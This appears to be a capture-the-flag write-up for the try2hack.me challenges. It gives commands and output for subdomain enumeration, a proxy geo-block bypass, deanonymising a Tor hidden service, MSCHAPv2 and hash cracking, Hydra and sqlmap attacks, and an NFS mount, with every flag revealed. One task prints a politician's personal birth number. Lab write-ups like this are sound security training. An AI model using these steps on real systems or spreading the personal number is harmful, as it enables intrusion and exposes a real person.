
**[Try 2 Hack Me](https://try2hack.me)**

---

## Úkol č. 1

### Zadání:

Na našem serveru, na kterém se momentálně nacházíš, existuje několik skrytých subdomén. Podaří se ti odhalit tu, která sestává z více jak 10 písmen, aniž bys použil útok hrubou silou? Heslo pro úspěšné splnění tohoto kola se nachází na objevené subdoméně. Pokud se ti místo hesla zobrazuje homepage, pak nejde o správné řešení.

---

### Postup řešení

```console
root@kali:~/Projects/CTF_tools# git clone https://github.com/aboul3la/Sublist3r.git
Cloning into 'Sublist3r'...
remote: Enumerating objects: 346, done.
remote: Total 346 (delta 0), reused 0 (delta 0), pack-reused 346
Receiving objects: 100% (346/346), 1.09 MiB | 2.02 MiB/s, done.
Resolving deltas: 100% (197/197), done.
root@kali:~/Projects/CTF_tools# cd Sublist3r/
root@kali:~/Projects/CTF_tools/Sublist3r# python sublist3r.py -d try2hack.me

                 ____        _     _ _     _   _____
                / ___| _   _| |__ | (_)___| |_|___ / _ __
                \___ \| | | | '_ \| | / __| __| |_ \| '__|
                 ___) | |_| | |_) | | \__ \ |_ ___) | |
                |____/ \__,_|_.__/|_|_|___/\__|____/|_|

                # Coded By Ahmed Aboul-Ela - @aboul3la

[-] Enumerating subdomains now for try2hack.me
[-] Searching now in Baidu..
[-] Searching now in Yahoo..
[-] Searching now in Google..
[-] Searching now in Bing..
[-] Searching now in Ask..
[-] Searching now in Netcraft..
[-] Searching now in DNSdumpster..
[-] Searching now in Virustotal..
[-] Searching now in ThreatCrowd..
[-] Searching now in SSL Certificates..
[-] Searching now in PassiveDNS..
[-] Total Unique Subdomains Found: 2
www.try2hack.me
secretsubdom.try2hack.me
```
Riesenie 2: https://crt.sh/?q=try2hack.me -> secretsubdom.try2hack.me
```
secretsubdom.try2hack.me
try2hack.me
www.try2hack.me
```

---

<details><summary>FLAG:</summary>

```
secretsubdom
```

</details>

---

## Úkol č. 2

### Zadání:

Při jednom ze tvých úspěšných útoků se ti podařilo odcizit hash hesla uživatele root, přičemž tajné heslo pro úspěšné dokončení tohoto kola se s tímto heslem shoduje. Podaří se ti ho prolomit?

```
$6$VQoztKJH$0aL8rygMd8gfX7m8cTRWOn4pqQ6bA/jkPyQSnzU0g10E0UiMQjIijs/66vflY7cMrGSKmmiBWE7r8oNCDQc3D/
```

---

### Postup řešení

---

<details><summary>FLAG:</summary>

```
temp
```

</details>

---

## Úkol č. 3

### Zadání:

Na [této](https://try2hack.me/AdminPanel.php) adrese se nachází administrace, která je dostupná pouze z Jižní Afriky. Podaří se ti obejít bezpečnostní mechanismus stránky tak, abys získal tajné heslo?

---

### Postup řešení

```bash
# https://www.proxynova.com/proxy-server-list/country-za/

curl -x 41.135.120.70:8080 -L https://try2hack.me/AdminPanel.php
```

---

<details><summary>FLAG:</summary>

```
Wi3ft0Wpizh8cV
```

</details>

---

## Úkol č. 4

### Zadání:

Zjisti skutečnou IP adresu serveru, na kterém je provozována skrytá služba v síti Tor s adresou ixbttupkdzeamjjkjyeqwkdmoawirpvxvzez3t5htq2nia24bink53ad.onion.

---

### Postup řešení

Install needed stuff.

```bash
root@kali:~# sudo apt-get install -y tor socat nikto
```

Run `tor` in the background.

```bash
root@kali:~# tor &
[1] 7503

May 08 09:53:27.629 [notice] Tor 0.3.5.8 running on Linux with Libevent 2.1.8-stable, OpenSSL 1.1.1, Zlib 1.2.11, Liblzma 5.2.2, and Libzstd 1.3.5.
May 08 09:53:27.629 [notice] Tor can't help you if you use it wrong! Learn how to be safe at https://www.torproject.org/download/download#warning
May 08 09:53:27.629 [warn] Tor was compiled with zstd 1.3.8, but is running with zstd 1.3.5. For safety, we'll avoid using advanced zstd functionality.
May 08 09:53:27.629 [notice] Read configuration file "/etc/tor/torrc".
May 08 09:53:27.633 [notice] Opening Socks listener on 127.0.0.1:9050
May 08 09:53:27.633 [notice] Opened Socks listener on 127.0.0.1:9050
May 08 09:53:27.000 [notice] Parsing GEOIP IPv4 file /usr/share/tor/geoip.
May 08 09:53:27.000 [notice] Parsing GEOIP IPv6 file /usr/share/tor/geoip6.
May 08 09:53:27.000 [warn] You are running Tor as root. You don't need to, and you probably shouldn't.
May 08 09:53:27.000 [notice] Bootstrapped 0%: Starting
May 08 09:53:28.000 [notice] Starting with guard context "default"
May 08 09:53:28.000 [notice] Bootstrapped 10%: Finishing handshake with directory server
May 08 09:53:28.000 [notice] Bootstrapped 80%: Connecting to the Tor network
May 08 09:53:28.000 [notice] Bootstrapped 90%: Establishing a Tor circuit
May 08 09:53:28.000 [notice] Bootstrapped 100%: Done
```

Run `socat` on background to map onion address to `127.0.0.1:8000`

```bash
root@kali:~# socat TCP4-LISTEN:8000,reuseaddr,fork SOCKS4A:127.0.0.1:ixbttupkdzeamjjkjyeqwkdmoawirpvxvzez3t5htq2nia24bink53ad.onion:80,socksport=9050 &
[2] 7550
```

Run `nikto` against remapped onion address `127.0.0.1:8000`.
(Note: This can take quite long time - over an hour for all scans.)

```bash
root@kali:~# nikto -h http://127.0.0.1:8000
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          127.0.0.1
+ Target Hostname:    127.0.0.1
+ Target Port:        8000
+ Start Time:         2019-05-08 09:54:23 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm 'Restricted Area'
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-561: /server-status: This reveals Apache information. bashent out appropriate line in the Apache conf file or restrict access to allowed sources.
May 08 11:10:06.000 [notice] Your system clock just jumped 3170 seconds forward; assuming established circuits no longer work.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8042 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2019-05-08 11:36:40 (GMT-4) (6137 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Check for `OSVDB-561: /server-status` as `nikto` suggested:

```bash
root@kali:~# curl http://127.0.0.1:8000/server-status
```

[Server status](./04/server-status.png ":ignore") site contained hostname ` cardingphorum.com`, just `dig` it and you have the IP address.

Postup 2: Rovno vyskusat znamu chybu adminov Torbrowser -> http://ixbttupkdzeamjjkjyeqwkdmoawirpvxvzez3t5htq2nia24bink53ad.onion/server-status 

---

<details><summary>FLAG:</summary>

```
31.31.76.46
```

</details>

---

## Úkol č. 5

### Zadání:

U hackované společnosti jsi vytvořil Rogue AP a zachytil níže uvedenou komunikaci. Tajné heslo se shoduje s heslem uživatele **novakp**.

```
mschapv2: Wed Apr 10 19:51:13 2019
     domain\username:     novakp
     username:            novakp
     challenge:           94:0f:90:ec:96:ce:32:ec
     response:            f0:8f:68:d2:29:94:da:62:be:c3:6e:26:b0:b1:1d:81:d9:01:24:73:5d:dd:ba:60
```

---

### Postup řešení

Using [chapcrack tool](https://github.com/moxie0/chapcrack) we convert the MSCHAPv2 challenge / response pair into string in CloudCracker Submission format:

```bash
root@kali:~/chapcrack# ./chapcrack.py radius -C 94:0f:90:ec:96:ce:32:ec -R f0:8f:68:d2:29:94:da:62:be:c3:6e:26:b0:b1:1d:81:d9:01:24:73:5d:dd:ba:60
Cracking K3............
                     C1 = f08f68d22994da62
                     C2 = bec36e26b0b11d81
                     C3 = d90124735dddba60
                      P = 940f90ec96ce32ec
                     K3 = a0b80000000000
CloudCracker Submission = $99$lA+Q7JbOMuzwj2jSKZTaYr7DbiawsR2BoLg=
```

We submit this to the online service [crack.sh](https://crack.sh/get-cracking/) and after 26 hours or less we get `NT hash`:

```email
From crack.sh:

Crack.sh has successfully completed its attack against your MSCHAPv2 handshake.
The NT hash for the handshake is included below,
and can be plugged back into the 'chapcrack' tool to decrypt a packet capture,
or to authenticate to the server:

Token: $99$lA+Q7JbOMuzwj2jSKZTaYr7DbiawsR2BoLg=
Key: 179ba8ef1a67098d535c72de9901a0b8

This run took 63804 seconds.
Thank you for using crack.sh, this concludes your job.
```

Subsequently we use [hashcat](https://hashcat.net/hashcat/) to crack this `NT hash` to get plain text password:

```bash
hashcat -m 1000 -w 3 -o found.txt -a 3 --username NT_hash.txt -1 ?l?d?u ?1?1?1?1?1?1?1?1 -i --increment-min 1 --increment-max 8
```

Postup 2: Alebo mozete rovno poskladat hash file z challenge & response
```
novakp:$NETNTLM$940f90ec96ce32ec$f08f68d22994da62bec36e26b0b11d81d90124735dddba60
```
A pouzit hashcat s hash modes 5500 -> NetNTLMv1 / NetNTLMv1+ESS


And after few hours we get:

```
179ba8ef1a67098d535c72de9901a0b8:********
```

---

<details><summary>FLAG:</summary>

```
d7Mus1fH
```

</details>

---

## Úkol č. 6

### Zadání:

Na našem serveru, na kterém se momentálně nacházíš, existuje několik skrytých subdomén. Podaří se ti odhalit tu, která sestává přesně ze 3 alfanumerických znaků? Při řešení úkolu lze využít útok hrubou silou, nikoliv však na formulář s heslem. Heslo pro úspěšné splnění tohoto kola se nachází na odhalené subdoméně.

---

### Postup řešení

```bash
function find-subdomain() {
	for c1 in {a..z} {0..9}; do
		for c2 in {a..z} {0..9}; do
			{
				for c3 in {a..z} {0..9}; do
					curl http://${c1}${c2}${c3}.try2hack.me 2>/dev/null | grep -i password
				done
			} | grep -i password && return 0
			wait
		done
	done
} 2>/dev/null
```

---

<details><summary>FLAG:</summary>

```
Bir63Fpw0d9MX
```

</details>

---

## Úkol č. 7

### Zadání:

Tajné heslo se shoduje s rodným číslem prezidenta České republiky Miloše Zemana. Podaří se ti je pomocí internetu zjistit, aniž bys použil metodu hrubé síly?

---

### Postup řešení

[neviditelna.rozhlas.cz](https://neviditelna.rozhlas.cz/socialni-site-digitalni-stopa-zustava-i-kdyz-sva-data-chranite-6821509)

---

<details><summary>FLAG:</summary>

```
440928/086
```

</details>

---

## Úkol č. 8

### Zadání:

Pro přihlášení do interního systému napadené společnosti je použita utilita [login](./08/login.zip ":ignore") zkompilovaná pro platformu Windows. Heslo pro přihlášení skrz tuto jednoúčelovou aplikaci je shodné s hledaným tajným heslem.

---

### Postup řešení


---

<details><summary>FLAG:</summary>

```
temp
```

</details>

---

## Úkol č. 9

### Zadání:

Tajné heslo pro splnění tohoto úkolu je stejné, jako anglicky psané město, ve kterém žije člověk jménem Jason Macrapatulos. Podaří se ti místo pobytu tohoto člověka vypátrat a splnit tak další z řady úkolů?

---

### Postup řešení

Putting the name into [facebook](https://www.facebook.com/) returned `Jason Macrapatulos's` profile (currently defunct), which contained link to his twitter account [JasonMacra](https://twitter.com/JasonMacra). This contained post with the picture of his house. After clicking on the date at the tweet, [the detailed tweet view](./09/JasonMacra_twitter.png ":ignore") revealed name of the city - `*******`.

---

<details><summary>FLAG:</summary>

```
Brudges
```

</details>

---

## Úkol č. 10

### Zadání:

Dokázal jsi proniknout do sítě významné společnosti, kde jsi zapnul sniffer a zachytil část [síťového provozu](./10/netdump.zip ":ignore"). Podaří se ti její analýzou získat tajné heslo, které se v daný moment přes síť přenášelo?

---

### Postup řešení

```bash
tshark -O SIP -nr ./netdump.pcap -qx | grep -A 2 -B 1 s.w.o.r.d | tr -d '.' | sed 's/.*   //' | tr -d '\n'
```

---

<details><summary>FLAG:</summary>

```
mNhr6sW9cs0sD4sVoVpwjf6C
```

</details>

---

## Úkol č. 11

### Zadání:

Tajné heslo pro splnění tohoto úkolu je schované v heslem chráněné [administraci](https://try2hack.me/manage/). Podaří se ti do ní dostat pomocí slovníkového útoku?

---

### Postup řešení

```bash
hydra -s 443 -S -V -l admin -P ./rockyou.txt -e s -t 30 -m /manage/ try2hack.me https-get
# [443][http-get] host: try2hack.me   login: admin   password: falcon
curl https://admin:falcon@try2hack.me/manage/
```

---

<details><summary>FLAG:</summary>

```
Veinsg5Vskg2Fpcb
```

</details>

---

## Úkol č. 12

### Zadání:

Zachytil jsi tajnou zprávu teroristické organizace. Podaří se ti ji rozluštit, pokud víš, že se jedná o Vernamovu šifru využívající operaci XOR nad klíčem, který je součástí textu Lorem Ipsum a odesilatel se v každé zprávě podepisuje jako *Ahmed*?

```
26041 f0f0a 54170 04f06 01011 b4f55 181d1 6001d 14005 d5722
13115 20000 00290 d1b0b 11401 91c29 49024 25433 010e0 017
```

```
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nam pharetra euismod ex, et dignissim risus sollicitudin id. Fusce ac mi sed massa dictum rutrum eu a eros. Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Mauris malesuada ultrices velit, non auctor justo varius in. Nullam eget consectetur odio. Sed euismod posuere enim, eu aliquet purus facilisis et. In hac habitasse platea dictumst. Proin elementum interdum lorem, eget egestas velit tincidunt vel. In imperdiet, eros congue porttitor malesuada, mi mi dignissim tellus, ut luctus magna neque nec turpis. Nam sed nulla quis elit tempor blandit placerat id enim. Morbi malesuada nibh sem, eu feugiat nibh rutrum ac. Mauris facilisis lorem ut lobortis maximus.
```

---

### Postup řešení

For this task we will use [CyberChef](https://gchq.github.io/CyberChef/).

The cypher text has `98` hex characters, therefore ASCII length of the cypher text, plain text and the key is `49` ASCII characters. We know that author always signs as `Ahmed`.


Converting `Ahmed` [to hex](https://gchq.github.io/CyberChef/#recipe=To_Hexdump(5,false,true)&input=QWhtZWQ) we get:

```hexdump
00000000  41 68 6d 65 64  |Ahmed|
00000005
```

Taking last `10 hexa` (5 ASCII) characters of `cypher text` we have:

```hexdump
00000000  33 01 0e 00 17  |3....|
00000005
```

 So XORing last 10 hexa (5 ASCII) characters of the `cypher text` with the last 10 hexa (5 ASCII) characters of the plain text (`Ahmed`) will give us:

```hexdump
00000000  72 69 63 65 73  |rices|
00000005
```

These are last 10 hexa (5 ASCII) characters of the 49 character `key`, which is part of provided `Lorem ipsum text`. Searching for `rices` in `Lorem ipsum` and taking whole 49 character key returns:

```
nascetur ridiculus mus. Mauris malesuada ultrices
```

[XORing](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Latin1','string':'nascetur%20ridiculus%20mus.%20Mauris%20malesuada%20ultrices'%7D,'Standard',false)&input=MjYwNDEgZjBmMGEgNTQxNzAgMDRmMDYgMDEwMTEgYjRmNTUgMTgxZDEgNjAwMWQgMTQwMDUgZDU3MjIKMTMxMTUgMjAwMDAgMDAyOTAgZDFiMGIgMTE0MDEgOTFjMjkgNDkwMjQgMjU0MzMgMDEwZTAgMDE3) cypher text with the whole key returns whole decrypted message:

```
Hello brother, the password is ***********. Ahmed
```


---

<details><summary>FLAG:</summary>

```
Dlwnb5xxHiw
```

</details>

---

## Úkol č. 13

### Zadání:

Získal jsi přístup k telefonu oběti, přičemž tvým cílem je průnik do v něm nainstalované, ovšem heslem chráněné aplikace [findmypass.apk](./13/findmypass.apk ":ignore"). Heslo pro přístup do uvedené aplikace se shoduje s tajným heslem tohoto kola.

---

### Postup řešení

```bash
docker run -v $(pwd):/apk duolabs/apk2java /apk/findmypass.apk
grep -A5 -R -i pass ./findmypass.apk.src/ | grep -i '"'
```

---

<details><summary>FLAG:</summary>

```
Secure1369Pass
```

</details>

---

## Úkol č. 14

### Zadání:

Správce serveru, na kterém se právě nacházíš, používá ke sdílení dat síťové úložiště. Podaří se ti je objevit a získat tak heslo pro splnění tohoto úkolu?

---

### Postup řešení

```bash
sudo mount -t nfs try2hack.me:$(showmount -e try2hack.me | tail -n 1 | awk '{ print $1 }') ./tmp/
cat ./tmp/Password.txt
sudo umount ./tmp
```

---

<details><summary>FLAG:</summary>

```
Ciw27xDowP20eXnv
```

</details>

---

## Úkol č. 15

### Zadání:

Cílový server používá pro monetizaci obsahu vlastní reklamní systém založený na bannerové reklamě. Podaří se ti v něm odhalit chybu a získat tak tajné heslo pro splnění tohoto úkolu?

---

### Postup řešení

After (long painful manual) checking for usual stuff we noticed that the URL for banner pictures [https://try2hack.me/a/5](https://try2hack.me/a/5) acts funny (can perform mathematical expressions and stuff). The trick was SQL injection behind URL rewrite, see [https://www.cybrary.it/0p3n/test-exploit-sql-injections-url-rewrite-rules/](https://www.cybrary.it/0p3n/test-exploit-sql-injections-url-rewrite-rules/) and [https://www.binarytides.com/sqlmap-hacking-tutorial/](https://www.binarytides.com/sqlmap-hacking-tutorial/) for reference.

After checking for SQL injections with `sqlmap`:

```bash
sqlmap -u "https://try2hack.me/a/1*" --random-agent --level 5 --risk 3 --dbs
```

Which after while returned:

```bash
available databases [2]:
[*] information_schema
[*] production
```

Going forward with `production` DB, we list it's tables:


```bash
sqlmap -u "https://try2hack.me/a/1*" --random-agent --level 5 --risk 3 -D production --tables
```

And get:
```bash
Database: production
[2 tables]
+---------+
| adverts |
| users   |
+---------+
```

Lets dump table `users`:

```bash
sqlmap -u "https://try2hack.me/a/1*" --random-agent --level 5 --risk 3 -D production -T users --dump
```

While dumping the table SQLmap detects hash in password column for the only user `admin` and offers to run dictionary attack against it, and voila:

```bash
[15:36:15] [INFO] cracked password '***********' for user 'admin'
Database: production
Table: users
[1 entry]
+----+-------+-------+--------+------------------------------------------------+
| id | name  | login | active | password                                       |
+----+-------+-------+--------+------------------------------------------------+
| 1  | Admin | admin | 1      | 42f749ade7f9e195bf475f37a44cafcb (***********) |
+----+-------+-------+--------+------------------------------------------------+
```

---

<details><summary>FLAG:</summary>

```
Password123
```

</details>
